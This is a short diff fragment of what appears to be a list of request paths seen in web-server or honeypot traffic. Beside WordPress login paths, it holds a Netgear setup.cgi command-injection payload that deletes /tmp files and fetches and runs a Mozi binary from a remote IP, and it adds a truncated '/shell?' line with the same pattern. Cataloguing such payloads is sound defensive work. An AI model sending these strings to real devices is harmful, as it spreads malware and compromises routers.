@@ -1126,3 +1126,4 @@ example.com:80
 /wordpress/wp-login.php
 /blog/wp-login.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.209.81.10:34250/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/shell?cd+/tmp;rm+-rf+*;wget+
